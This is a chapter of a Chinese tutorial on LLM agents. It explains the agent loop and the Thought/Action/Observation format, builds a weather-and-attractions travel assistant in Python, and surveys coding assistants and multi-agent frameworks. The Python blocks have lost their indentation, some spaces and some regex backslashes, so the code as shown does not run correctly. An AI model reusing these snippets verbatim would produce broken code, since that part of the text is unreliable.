<p>其次，行动的结果也并非总是确定的。根据结果的可预测性，环境可分为<strong>确定性</strong>和<strong>随机性</strong>。旅行助手的任务环境就是典型的随机性环境。当它搜索票价时，两次相邻的调用返回的机票价格和余票数量都可能不同，这就要求智能体必须具备处理不确定性、监控变化并及时决策的能力。</p>
<p>此外，环境中还可能存在其他行动者，从而形成<strong>多智能体(Multi-agent)</strong>  环境。对于旅行助手而言，其他用户的预订行为、其他自动化脚本，甚至航司的动态调价系统，都是环境中的其他“智能体”。它们的行动（例如，订走最后一张特价票）会直接改变旅行助手所处环境的状态，这对智能体的快速响应和策略选择提出了更高要求。</p>
<p>最后，几乎所有任务都发生在<strong>序贯</strong>且<strong>动态</strong>的环境中。“序贯”意味着当前动作会影响未来；而“动态”则意味着环境自身可能在智能体决策时发生变化。这就要求智能体的“感知-思考-行动-观察”循环必须能够快速、灵活地适应持续变化的世界。</p>
<h4 data-id="heading-6">1.2.2 智能体的运行机制</h4>
<p>在定义了智能体所处的任务环境后，我们来探讨其核心的运行机制。智能体并非一次性完成任务，而是通过一个持续的循环与环境进行交互，这个核心机制被称为 <strong>智能体循环 (Agent Loop)</strong> 。如图1.5所示，该循环描述了智能体与环境之间的动态交互过程，构成了其自主行为的基础。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b9c9cf05e23545438e22333b49f245ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853724&amp;x-signature=GVR%2FmlT52TeMvbn8qeUnim2AQoE%3D" alt="" loading="lazy"/></p>
<p>图 1.5 智能体与环境交互的基本循环</p>
<p>这个循环主要包含以下几个相互关联的阶段：</p>
<ol start="0">
<li><strong>感知 (Perception)</strong> ：这是循环的起点。智能体通过其传感器（例如，API的监听端口、用户输入接口）接收来自环境的输入信息。这些信息，即<strong>观察 (Observation)</strong> ，既可以是用户的初始指令，也可以是上一步行动所导致的环境状态变化反馈。</li>
<li><strong>思考 (Thought)</strong> ：接收到观察信息后，智能体进入其核心决策阶段。对于LLM智能体而言，这通常是由大语言模型驱动的内部推理过程。如图所示，“思考”阶段可进一步细分为两个关键环节：</li>
</ol>
<ul>
<li><strong>规划 (Planning)</strong> ：智能体基于当前的观察和其内部记忆，更新对任务和环境的理解，并制定或调整一个行动计划。这可能涉及将复杂目标分解为一系列更具体的子任务。</li>
<li><strong>工具选择 (Tool Selection)</strong> ：根据当前计划，智能体从其可用的工具库中，选择最适合执行下一步骤的工具，并确定调用该工具所需的具体参数。</li>
</ul>
<ol start="3">
<li><strong>行动 (Action)</strong> ：决策完成后，智能体通过其执行器（Actuators）执行具体的行动。这通常表现为调用一个选定的工具（如代码解释器、搜索引擎API），从而对环境施加影响，意图改变环境的状态。</li>
</ol>
<p>行动并非循环的终点。智能体的行动会引起<strong>环境 (Environment)</strong>  的<strong>状态变化 (State Change)</strong> ，环境随即会产生一个新的<strong>观察 (Observation)</strong>  作为结果反馈。这个新的观察又会在下一轮循环中被智能体的感知系统捕获，形成一个持续的“感知-思考-行动-观察”的闭环。智能体正是通过不断重复这一循环，逐步推进任务，从初始状态向目标状态演进。</p>
<h4 data-id="heading-7">1.2.3 智能体的感知与行动</h4>
<p>在工程实践中，为了让LLM能够有效驱动这个循环，我们需要一套明确的<strong>交互协议 (Interaction Protocol)</strong>  来规范其与环境之间的信息交换。</p>
<p>在许多现代智能体框架中，这一协议体现在对智能体每一次输出的结构化定义上。智能体的输出不再是单一的自然语言回复，而是一段遵循特定格式的文本，其中明确地展示了其内部的推理过程与最终决策。</p>
<p>这个结构通常包含两个核心部分：</p>
<ul>
<li><strong>Thought (思考)</strong> ：这是智能体内部决策的“快照”。它以自然语言形式阐述了智能体如何分析当前情境、回顾上一步的观察结果、进行自我反思与问题分解，并最终规划出下一步的具体行动。</li>
<li><strong>Action (行动)</strong> ：这是智能体基于思考后，决定对环境施加的具体操作，通常以函数调用的形式表示。</li>
</ul>
<p>例如，一个正在规划旅行的智能体可能会生成如下格式化的输出：</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">Thought:</span> 用户想知道北京的天气。我需要调用天气查询工具。
<span class="hljs-symbol">Action:</span> get_weather(<span class="hljs-string">"北京"</span>)
</code></pre>
<p>这里的<code>Action</code>字段构成了对外部世界的指令。一个外部的<strong>解析器 (Parser)</strong>  会捕捉到这个指令，并调用相应的<code>get_weather</code>函数。</p>
<p>行动执行后，环境会返回一个结果。例如，<code>get_weather</code>函数可能返回一个包含详细天气数据的JSON对象。然而，原始的机器可读数据（如JSON）通常包含LLM无需关注的冗余信息，且格式不符合其自然语言处理的习惯。</p>
<p>因此，感知系统的一个重要职责就是扮演传感器的角色：将这个原始输出处理并封装成一段简洁、清晰的自然语言文本，即观察。</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">Observation: 北京当前天气为晴，气温25摄氏度，微风。</span>
</code></pre>
<p>这段<code>Observation</code>文本会被反馈给智能体，作为下一轮循环的主要输入信息，供其进行新一轮的<code>Thought</code>和<code>Action</code>。</p>
<p>综上所述，通过这个由Thought、Action、Observation构成的严谨循环，LLM智能体得以将内部的语言推理能力，与外部环境的真实信息和工具操作能力有效地结合起来。</p>
<h3 data-id="heading-8">1.3 动手体验：5 分钟实现第一个智能体</h3>
<p>在前面的小节，我们学习了智能体的任务环境、核心运行机制以及<code>Thought-Action-Observation</code>交互范式。理论知识固然重要，但最好的学习方式是亲手实践。在本节中，我们将引导您使用几行简单的Python代码，从零开始构建一个可以工作的智能旅行助手。这个过程将遵循我们刚刚学到的理论循环，让您直观地感受到一个智能体是如何“思考”并与外部“工具”互动的。让我们开始吧！</p>
<p>在本案例中，我们的目标是构建一个能处理分步任务的智能旅行助手。需要解决的用户任务定义为："你好，请帮我查询一下今天北京的天气，然后根据天气推荐一个合适的旅游景点。"要完成这个任务，智能体必须展现出清晰的逻辑规划能力。它需要先调用天气查询工具，并将获得的观察结果作为下一步的依据。在下一轮循环中，它再调用景点推荐工具，从而得出最终建议。</p>
<h4 data-id="heading-9">1.3.1 准备工作</h4>
<p>为了能从Python程序中访问网络API，我们需要一个HTTP库。<code>requests</code>是Python社区中最流行、最易用的选择。<code>tavily-python</code>是一个强大的AI搜索API客户端，用于获取实时的网络搜索结果，可以在官网注册后获取API。<code>openai</code>是OpenAI官方提供的Python SDK，用于调用GPT等大语言模型服务。请先通过以下命令安装它们：</p>
<pre><code class="hljs">pip install requests tavily-python openai
</code></pre>
<p>1）指令模板</p>
<p>驱动真实LLM的关键在于<strong>提示工程（Prompt Engineering）</strong> 。我们需要设计一个“指令模板”，告诉LLM它应该扮演什么角色、拥有哪些工具、以及如何格式化它的思考和行动。这是我们智能体的“说明书”，它将作为<code>system_prompt</code>传递给LLM。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">AGENT_SYSTEM_PROMPT</span> =
""
"
你是一个智能旅行助手。你的任务是分析用户的请求，并使用可用工具一步步地解决问题。
<span class="hljs-comment"># 可用工具:</span>
- `get_weather(city: str)`: 查询指定城市的实时天气。
- `get_attraction(city: str, weather: str)`: 根据城市和天气搜索推荐的旅游景点。
<span class="hljs-comment"># 行动格式:</span>
你的回答必须严格遵循以下格式。首先是你的思考过程，然后是你要执行的具体行动。
Thought: <span class="hljs-section">[这里是你的思考过程和下一步计划]</span>
Action: <span class="hljs-section">[这里是你要调用的工具，格式为 function_name(arg_name="
arg_value
")]</span>
<span class="hljs-comment"># 任务完成:</span>
当你收集到足够的信息，能够回答用户的最终问题时，你必须使用 `finish(<span class="hljs-attr">answer</span>=<span class="hljs-string">"
...
"</span>)` 来输出最终答案。
请开始吧！
"
""
</code></pre>
<p>2）工具1：查询真实天气</p>
<p>我们将使用免费的天气查询服务<code>wttr.in</code>，它能以JSON格式返回指定城市的天气数据。下面是实现该工具的代码：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> json
defget_weather(city: <span class="hljs-built_in">str</span>) -&gt; <span class="hljs-built_in">str</span>:
<span class="hljs-string">"""
通过调用 wttr.in API 查询真实的天气信息。
"""</span>
<span class="hljs-comment"># API端点，我们请求JSON格式的数据</span>
url = <span class="hljs-string">f"https://wttr.in/<span class="hljs-subst">{city}</span>?format=j1"</span>
<span class="hljs-keyword">try</span>:
<span class="hljs-comment"># 发起网络请求</span>
response = requests.get(url)
<span class="hljs-comment"># 检查响应状态码是否为200 (成功)</span>
response.raise_for_status()
<span class="hljs-comment"># 解析返回的JSON数据</span>
data = response.json()
<span class="hljs-comment"># 提取当前天气状况</span>
current_condition = data[<span class="hljs-string">'current_condition'</span>][<span class="hljs-number">0</span>]
weather_desc = current_condition[<span class="hljs-string">'weatherDesc'</span>][<span class="hljs-number">0</span>][<span class="hljs-string">'value'</span>]
temp_c = current_condition[<span class="hljs-string">'temp_C'</span>]
<span class="hljs-comment"># 格式化成自然语言返回</span>
<span class="hljs-keyword">return</span><span class="hljs-string">f"<span class="hljs-subst">{city}</span>当前天气：<span class="hljs-subst">{weather_desc}</span>，气温<span class="hljs-subst">{temp_c}</span>摄氏度"</span>
<span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:
<span class="hljs-comment"># 处理网络错误</span>
<span class="hljs-keyword">return</span><span class="hljs-string">f"错误：查询天气时遇到网络问题 - <span class="hljs-subst">{e}</span>"</span>
<span class="hljs-keyword">except</span> (KeyError, IndexError) <span class="hljs-keyword">as</span> e:
<span class="hljs-comment"># 处理数据解析错误</span>
<span class="hljs-keyword">return</span><span class="hljs-string">f"错误：解析天气数据失败，可能是城市名称无效 - <span class="hljs-subst">{e}</span>"</span>
</code></pre>
<p>3）工具2：搜索并推荐旅游景点</p>
<p>我们将定义一个新工具<code>search_attraction</code>，它会根据城市和天气状况，互联网上搜索合适的景点：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">from</span> tavily <span class="hljs-keyword">import</span> TavilyClient
defget_attraction(city: <span class="hljs-built_in">str</span>, weather: <span class="hljs-built_in">str</span>) -&gt; <span class="hljs-built_in">str</span>:
<span class="hljs-string">"""
根据城市和天气，使用Tavily Search API搜索并返回优化后的景点推荐。
"""</span>
<span class="hljs-comment"># 1. 从环境变量中读取API密钥</span>
api_key = os.environ.get(<span class="hljs-string">"TAVILY_API_KEY"</span>)
ifnot api_key:
<span class="hljs-keyword">return</span><span class="hljs-string">"错误：未配置TAVILY_API_KEY环境变量。"</span>
<span class="hljs-comment"># 2. 初始化Tavily客户端</span>
tavily = TavilyClient(api_key=api_key)
<span class="hljs-comment"># 3. 构造一个精确的查询</span>
query = <span class="hljs-string">f"'<span class="hljs-subst">{city}</span>' 在'<span class="hljs-subst">{weather}</span>'天气下最值得去的旅游景点推荐及理由"</span>
<span class="hljs-keyword">try</span>:
<span class="hljs-comment"># 4. 调用API，include_answer=True会返回一个综合性的回答</span>
response = tavily.search(query=query, search_depth=<span class="hljs-string">"basic"</span>, include_answer=<span class="hljs-literal">True</span>)
<span class="hljs-comment"># 5. Tavily返回的结果已经非常干净，可以直接使用</span>
<span class="hljs-comment"># response['answer'] 是一个基于所有搜索结果的总结性回答</span>
<span class="hljs-keyword">if</span> response.get(<span class="hljs-string">"answer"</span>):
<span class="hljs-keyword">return</span> response[<span class="hljs-string">"answer"</span>]
<span class="hljs-comment"># 如果没有综合性回答，则格式化原始结果</span>
formatted_results = []
<span class="hljs-keyword">for</span> result <span class="hljs-keyword">in</span> response.get(<span class="hljs-string">"results"</span>, []):
formatted_results.append(<span class="hljs-string">f"- <span class="hljs-subst">{result[<span class="hljs-string">'title'</span>]}</span>: <span class="hljs-subst">{result[<span class="hljs-string">'content'</span>]}</span>"</span>)
ifnot formatted_results:
<span class="hljs-keyword">return</span><span class="hljs-string">"抱歉，没有找到相关的旅游景点推荐。"</span>
<span class="hljs-keyword">return</span><span class="hljs-string">"根据搜索，为您找到以下信息：\n"</span> + <span class="hljs-string">"\n"</span>.join(formatted_results)
<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
<span class="hljs-keyword">return</span><span class="hljs-string">f"错误：执行Tavily搜索时出现问题 - <span class="hljs-subst">{e}</span>"</span>
</code></pre>
<p>最后，我们将所有工具函数放入一个字典，供主循环调用：</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-comment"># 将所有工具函数放入一个字典，方便后续调用</span>
available_tools = {
<span class="hljs-string">"get_weather"</span>: get_weather,
<span class="hljs-string">"get_attraction"</span>: get_attraction,
}
</code></pre>
<h4 data-id="heading-10">1.3.2 接入大语言模型</h4>
<p>当前，许多LLM服务提供商（包括OpenAI、Azure、以及众多开源模型服务框架如Ollama、vLLM等）都遵循了与OpenAI API相似的接口规范。这种标准化为开发者带来了极大的便利。智能体的自主决策能力来源于LLM。我们将实现一个通用的客户端<code>OpenAICompatibleClient</code>，它可以连接到任何兼容OpenAI接口规范的LLM服务。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> openai <span class="hljs-keyword">import</span> OpenAI
classOpenAICompatibleClient:
<span class="hljs-string">"""
一个用于调用任何兼容OpenAI接口的LLM服务的客户端。
"""</span>
def__init__(self, model: <span class="hljs-built_in">str</span>, api_key: <span class="hljs-built_in">str</span>, base_url: <span class="hljs-built_in">str</span>):
self.model = model
self.client = OpenAI(api_key=api_key, base_url=base_url)
defgenerate(self, prompt: <span class="hljs-built_in">str</span>, system_prompt: <span class="hljs-built_in">str</span>) -&gt; <span class="hljs-built_in">str</span>:
<span class="hljs-string">"""调用LLM API来生成回应。"""</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"正在调用大语言模型..."</span>)
<span class="hljs-keyword">try</span>:
messages = [
{<span class="hljs-string">'role'</span>: <span class="hljs-string">'system'</span>, <span class="hljs-string">'content'</span>: system_prompt},
{<span class="hljs-string">'role'</span>: <span class="hljs-string">'user'</span>, <span class="hljs-string">'content'</span>: prompt}
]
response = self.client.chat.completions.create(
model=self.model,
messages=messages,
stream=<span class="hljs-literal">False</span>
)
answer = response.choices[<span class="hljs-number">0</span>].message.content
<span class="hljs-built_in">print</span>(<span class="hljs-string">"大语言模型响应成功。"</span>)
<span class="hljs-keyword">return</span> answer
<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"调用LLM API时发生错误: <span class="hljs-subst">{e}</span>"</span>)
<span class="hljs-keyword">return</span><span class="hljs-string">"错误：调用语言模型服务时出错。"</span>
</code></pre>
<p>要实例化此类，您需要提供三个信息：<code>API_KEY</code>、<code>BASE_URL</code>和 <code>MODEL_ID</code>，具体值取决于您使用的服务商（如OpenAI官方、Azure、或Ollama等本地模型），如果暂时没有渠道获取，可以参考Datawhale另一本教程的1.2 API设置。</p>
<h4 data-id="heading-11">1.3.3 执行行动循环</h4>
<p>下面的主循环将整合所有组件，并通过格式化后的Prompt驱动LLM进行决策。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> re
<span class="hljs-comment"># --- 1. 配置LLM客户端 ---</span>
<span class="hljs-comment"># 请根据您使用的服务，将这里替换成对应的凭证和地址</span>
API_KEY = <span class="hljs-string">"YOUR_API_KEY"</span>
BASE_URL = <span class="hljs-string">"YOUR_BASE_URL"</span>
MODEL_ID = <span class="hljs-string">"YOUR_MODEL_ID"</span>
TAVILY_API_KEY=<span class="hljs-string">"YOUR_Tavily_KEY"</span>
os.environ[<span class="hljs-string">'TAVILY_API_KEY'</span>] = <span class="hljs-string">"YOUR_TAVILY_API_KEY"</span>
llm = OpenAICompatibleClient(
model=MODEL_ID,
api_key=API_KEY,
base_url=BASE_URL
)
<span class="hljs-comment"># --- 2. 初始化 ---</span>
user_prompt = <span class="hljs-string">"你好，请帮我查询一下今天北京的天气，然后根据天气推荐一个合适的旅游景点。"</span>
prompt_history = [<span class="hljs-string">f"用户请求: <span class="hljs-subst">{user_prompt}</span>"</span>]
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"用户输入: <span class="hljs-subst">{user_prompt}</span>\n"</span> + <span class="hljs-string">"="</span>*<span class="hljs-number">40</span>)
<span class="hljs-comment"># --- 3. 运行主循环 ---</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>): <span class="hljs-comment"># 设置最大循环次数</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"--- 循环 <span class="hljs-subst">{i+<span class="hljs-number">1</span>}</span> ---\n"</span>)
<span class="hljs-comment"># 3.1. 构建Prompt</span>
full_prompt = <span class="hljs-string">"\n"</span>.join(prompt_history)
<span class="hljs-comment"># 3.2. 调用LLM进行思考</span>
llm_output = llm.generate(full_prompt, system_prompt=AGENT_SYSTEM_PROMPT)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"模型输出:\n<span class="hljs-subst">{llm_output}</span>\n"</span>)
prompt_history.append(llm_output)
<span class="hljs-comment"># 3.3. 解析并执行行动</span>
action_match = re.search(<span class="hljs-string">r"Action: (.*)"</span>, llm_output, re.DOTALL)
ifnot action_match:
<span class="hljs-built_in">print</span>(<span class="hljs-string">"解析错误：模型输出中未找到 Action。"</span>)
<span class="hljs-keyword">break</span>
action_str = action_match.group(<span class="hljs-number">1</span>).strip()
<span class="hljs-keyword">if</span> action_str.startswith(<span class="hljs-string">"finish"</span>):
final_answer = re.search(<span class="hljs-string">r'finish(answer="(.*)")'</span>, action_str).group(<span class="hljs-number">1</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"任务完成，最终答案: <span class="hljs-subst">{final_answer}</span>"</span>)
<span class="hljs-keyword">break</span>
tool_name = re.search(<span class="hljs-string">r"(\w+)("</span>, action_str).group(<span class="hljs-number">1</span>)
args_str = re.search(<span class="hljs-string">r"((.*))"</span>, action_str).group(<span class="hljs-number">1</span>)
kwargs = <span class="hljs-built_in">dict</span>(re.findall(<span class="hljs-string">r'(\w+)="([^"]*)"'</span>, args_str))
<span class="hljs-keyword">if</span> tool_name <span class="hljs-keyword">in</span> available_tools:
observation = available_tools[tool_name](**kwargs)
<span class="hljs-keyword">else</span>:
observation = <span class="hljs-string">f"错误：未定义的工具 '<span class="hljs-subst">{tool_name}</span>'"</span>
<span class="hljs-comment"># 3.4. 记录观察结果</span>
observation_str = <span class="hljs-string">f"Observation: <span class="hljs-subst">{observation}</span>"</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{observation_str}</span>\n"</span> + <span class="hljs-string">"="</span>*<span class="hljs-number">40</span>)
prompt_history.append(observation_str)
</code></pre>
<p>通过以上步骤，我们构建了一个完整的、由真实LLM驱动的智能体。其核心在于“工具”和“提示工程”的结合，这正是当前主流智能体框架（如LangChain、LlamaIndex等）的设计精髓。</p>
<h4 data-id="heading-12">1.3.4 运行案例分析</h4>
<p>以下输出完整地展示了一个成功的智能体执行流程。通过对这个三轮循环的分析，我们可以清晰地看到智能体解决问题的核心能力。</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">用户输入: 你好，请帮我查询一下今天北京的天气，然后根据天气推荐一个合适的旅游景点。</span>
========================================
--- 循环 1 ---
正在调用大语言模型...
大语言模型响应成功。
<span class="hljs-section">模型输出:</span>
<span class="hljs-section">Thought: 首先需要获取北京今天的天气情况，之后再根据天气情况来推荐旅游景点。</span>
<span class="hljs-section">Action: get_weather(city="北京")</span>
<span class="hljs-section">Observation: 北京当前天气：Sunny，气温26摄氏度</span>
========================================
--- 循环 2 ---
正在调用大语言模型...
大语言模型响应成功。
<span class="hljs-section">模型输出:</span>
<span class="hljs-section">Thought: 现在已经知道了北京今天的天气是晴朗且温度适中，接下来可以基于这个信息来推荐一个适合的旅游景点了。</span>
<span class="hljs-section">Action: get_attraction(city="北京", weather="Sunny")</span>
<span class="hljs-section">Observation: 北京在晴天最值得去的旅游景点是颐和园，因其美丽的湖景和古建筑。另一个推荐是长城，因其壮观的景观和历史意义。</span>
========================================
--- 循环 3 ---
正在调用大语言模型...
大语言模型响应成功。
<span class="hljs-section">模型输出:</span>
<span class="hljs-section">Thought: 已经获得了两个适合晴天游览的景点建议，现在可以根据这些信息给用户提供满意的答复。</span>
<span class="hljs-section">Action: finish(answer="今天北京的天气是晴朗的，气温26摄氏度，非常适合外出游玩。我推荐您去颐和园欣赏美丽的湖景和古建筑，或者前往长城体验其壮观的景观和深厚的历史意义。希望您有一个愉快的旅行！</span>
<span class="hljs-string">")
任务完成，最终答案: 今天北京的天气是晴朗的，气温26摄氏度，非常适合外出游玩。我推荐您去颐和园欣赏美丽的湖景和古建筑，或者前往长城体验其壮观的景观和深厚的历史意义。希望您有一个愉快的旅行！
</span></code></pre>
<p>这个简单的旅行助手案例，集中演示了基于<code>Thought-Action-Observation</code>范式的智能体所具备的四项基本能力：任务分解、工具调用、上下文理解和结果合成。正是通过这个循环的不断迭代，智能体才得以将一个模糊的用户意图，转化为一系列具体、可执行的步骤，并最终达成目标。</p>
<h3 data-id="heading-13">1.4 智能体应用的协作模式</h3>
<p>上一节，我们通过亲手构建一个智能体，深入理解了其内部的运作循环。不过在更广泛的应用场景中，我们的角色正越来越多地转变为使用者与协作者。基于智能体在任务中的角色和自主性程度，其协作模式主要分为两种：一种是作为高效工具，深度融入我们的工作流；另一种则是作为自主的协作者，与其他智能体协作完成复杂目标。</p>
<h4 data-id="heading-14">1.4.1 作为开发者工具的智能体</h4>
<p>在这种模式下，智能体被深度集成到开发者的工作流中，作为一种强大的辅助工具。它增强而非取代开发者的角色，通过自动化处理繁琐、重复的任务，让开发者能更专注于创造性的核心工作。这种人机协同的方式，极大地提升了软件开发的效率与质量。</p>
<p>目前，市场上涌现了多款优秀的AI编程辅助工具，它们虽然均能提升开发效率，但在实现路径和功能侧重上各有千秋：</p>
<ul>
<li><strong>GitHubCopilot</strong>: 作为该领域最具影响力的产品之一，Copilot 由 GitHub 与 OpenAI 联合开发。它深度集成于 Visual Studio Code等主流编辑器中，以其强大的代码自动补全能力而闻名。开发者在编写代码时，Copilot 能实时提供整行甚至整个函数块的建议。近年来，它也通过 Copilot Chat 扩展了对话式编程的能力，允许开发者在编辑器内通过聊天解决编程问题。</li>
<li><strong>Claude Code</strong>: Claude Code 是由 Anthropic 开发的 AI 编程助手，旨在通过自然语言指令帮助开发者在终端中高效地完成编码任务。它能够理解完整的代码库结构，执行代码编辑、测试和调试等操作，支持从描述功能到代码实现的全流程开发。Claude Code 还提供了无交互（headless）模式，适用于 CI、pre-commit hooks、构建脚本和其他自动化场景，为开发者提供了强大的命令行编程体验。</li>
<li><strong>Trae</strong>: 作为新兴的 AI 编程工具，Trae 专注于为开发者提供智能化的代码生成和优化服务。它通过深度学习技术分析代码模式，能够为开发者提供精准的代码建议和自动化重构方案。Trae 的特色在于其轻量级的设计和快速响应能力，特别适合需要频繁迭代和快速原型开发的场景。</li>
<li><strong>Cursor</strong>: 与上述主要作为插件或集成功能存在的工具不同，Cursor 则选择了一条更具整合性的路径，它本身就是一个AI原生的代码编辑器。它并非在现有编辑器上增加AI功能，而是在设计之初就将AI交互作为核心。除了具备顶级的代码生成和聊天能力外，它更强调让AI理解整个代码库的上下文，从而实现更深层次的问答、重构和调试。</li>
</ul>
<p>当然还有许多优秀的工具没有例举，不过它们共同指向了一个明确的趋势：AI 正在深度融入软件开发的全生命周期，通过构建高效的人机协同工作流，深刻地重塑着软件工程的效率边界与开发范式。</p>
<h4 data-id="heading-15">1.4.2 作为自主协作者的智能体</h4>
<p>与作为工具辅助人类不同，第二种交互模式将智能体的自动化程度提升到了一个全新的层次，自主协作者。在这种模式下，我们不再是手把手地指导AI完成每一步，而是将一个高层级的目标委托给它。智能体会像一个真正的项目成员一样，独立地进行规划、推理、执行和反思，直到最终交付成果。这种从助手到协作者的转变，使得LLM智能体更深的进入了大众的视野。它标志着我们与AI的关系从“命令-执行”演变为“目标-委托”。智能体不再是被动的工具，而是主动的目标追求者。</p>
<p>当前，实现这种自主协作的思路百花齐放，涌现了大量优秀的框架和产品，从早期的 BabyAGI、AutoGPT，到如今更为成熟的 CrewAI、AutoGen、MetaGPT、LangGraph 等优秀框架，共同推动着这一领域的高速发展。虽然具体实现千差万别，但它们的架构范式大致可以归纳为几个主流方向：</p>
<ol>
<li><strong>单智能体自主循环</strong>：这是早期的典型范式，如 <strong>AgentGPT</strong> 所代表的模式。其核心是一个通用智能体通过“思考-规划-执行-反思”的闭环，不断进行自我提示和迭代，以完成一个开放式的高层级目标。</li>
<li><strong>多智能体协作</strong>：这是当前最主流的探索方向，旨在通过模拟人类团队的协作模式来解决复杂问题。它又可细分为不同模式： <strong>角色扮演式对话</strong>：如 <strong>CAMEL</strong> 框架，通过为两个智能体（例如，“程序员”和“产品经理”）设定明确的角色和沟通协议，让它们在一个结构化的对话中协同完成任务。 <strong>组织化工作流</strong>：如 <strong>MetaGPT</strong> 和 <strong>CrewAI</strong>，它们模拟一个分工明确的“虚拟团队”（如软件公司或咨询小组）。每个智能体都有预设的职责和工作流程（SOP），通过层级化或顺序化的方式协作，产出高质量的复杂成果（如完整的代码库或研究报告）。<strong>AutoGen</strong> 和 <strong>AgentScope</strong> 则提供了更灵活的对话模式，允许开发者自定义智能体间的复杂交互网络。</li>
<li><strong>高级控制流架构</strong>：诸如 <strong>LangGraph</strong> 等框架，则更侧重于为智能体提供更强大的底层工程基础。它将智能体的执行过程建模为状态图（State Graph），从而能更灵活、更可靠地实现循环、分支、回溯以及人工介入等复杂流程。</li>
</ol>
<p>这些不同的架构范式，共同推动着自主智能体从理论构想走向更广泛的实际应用，使其有能力应对日益复杂的真实世界任务。在我们的后续章节中，也会感受不同类型框架之间的差异和优势。</p>
<h4 data-id="heading-16">1.4.3 Workflow和Agent的差异</h4>
<p>在理解了智能体作为“工具”和“协作者”两种模式后，我们有必要对Workflow和Agent的差异展开讨论，尽管它们都旨在实现任务自动化，但其底层逻辑、核心特征和适用场景却截然不同。</p>
<p>简单来说，<strong>Workflow 是让 AI 按部就班地执行指令，而 Agent 则是赋予 AI 自由度去自主达成目标。</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7a203bdb6a5e447581809af83ef0978f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853724&amp;x-signature=bQBqb0R%2FAFn29OXaKs3H1KWw30o%3D" alt="" loading="lazy"/></p>
<p>图 1.6 Workflow和Agent的差异</p>
<p>如图1.6所示，工作流是一种传统的自动化范式，其核心是<strong>对一系列任务或步骤进行预先定义的、结构化的编排</strong>。它本质上是一个精确的、静态的流程图，规定了在何种条件下、以何种顺序执行哪些操作。一个典型的案例：某企业的费用报销审批流程。员工提交报销单（触发）-&gt; 如果金额小于500元，直接由部门经理审批 -&gt; 如果金额大于500元，先由部门经理审批，再流转至财务总监审批 -&gt; 审批通过后，通知财务部打款。整个过程的每一步、每一个判断条件都被精确地预先设定。</p>
<p>与工作流不同，基于大型语言模型的智能体是一个<strong>具备自主性的、以目标为导向的系统</strong>。它不仅仅是执行预设指令，而是能够在一定程度上理解环境、进行推理、制定计划，并动态地采取行动以达成最终目标。LLM在其中扮演着“大脑”的角色。一个典型的例子，便是我们在1.3节中写的智能旅行助手。当我们向它下达一个新指令，例如： <strong>“你好，请帮我查询一下今天北京的天气，然后根据天气推荐一个合适的旅游景点。”</strong>  它的处理过程充分展现了其自主性：</p>
<ol start="0">
<li><strong>规划与工具调用：</strong> Agent首先会把任务拆解为两个步骤：① 查询天气；② 基于天气推荐景点。随即，它会自主选择并调用“天气查询API”，并将“北京”作为参数传入。</li>
<li><strong>推理与决策：</strong> 假设API返回结果为“晴朗，微风”。Agent的LLM大脑会基于这个信息进行推理：“晴天适合户外活动”。接着，它会根据这个判断，在它的知识库或通过搜索引擎这个工具中，筛选出北京的户外景点，如故宫、颐和园、天坛公园等。</li>
<li><strong>生成结果：</strong> 最后，Agent会综合信息，给出一个完整的、人性化的回答：“今天北京天气晴朗，微风，非常适合户外游玩。为您推荐前往【颐和园】，您可以在昆明湖上泛舟，欣赏美丽的皇家园林景色。”</li>
</ol>
<p>在这个过程中，没有任何写死的<code>if天气=晴天 then 推荐颐和园</code>的规则。如果天气是“雨天”，Agent会自主推理并推荐国家博物馆、首都博物馆等室内场所。<strong>这种基于实时信息进行动态推理和决策的能力，正是Agent的核心价值所在。</strong></p>
<h3 data-id="heading-17">1.5 本章小结</h3>
<p>在本章中，我们共同踏上了探索智能体的初识之旅。我们的旅程从最基本的问题开始：</p>
<ul>
<li>什么是大语言模型驱动的智能体？我们首先明确了其定义，理解了现代智能体是具备了能力的实体。它不再仅仅是执行预设程序的脚本，而是能够自主推理和使用工具的决策者。</li>
<li>智能体如何工作？我们深入探讨了智能体与环境交互的运行机制。我们了解到，这个持续的闭环是智能体处理信息、做出决策、影响环境并根据反馈调整自身行为的基础。</li>
<li>如何构建智能体？这是本章的实践核心。我们以“智能旅行助手”为例，亲手构建了一个完整的、由真实LLM驱动的智能体。</li>
<li>智能体有哪些主流的应用范式？最后，我们将视野投向了更广阔的应用领域。我们探讨了两种主流的智能体交互模式：一是以GitHub Copilot和Cursor等为代表的、增强人类工作流的“开发者工具”；二是以CrewAI、MetaGPT和AgentScope等框架为代表的、能够独立完成高层级目标的“自主协作者”。同时讲解了Workflow与Agent的差异。</li>
</ul>
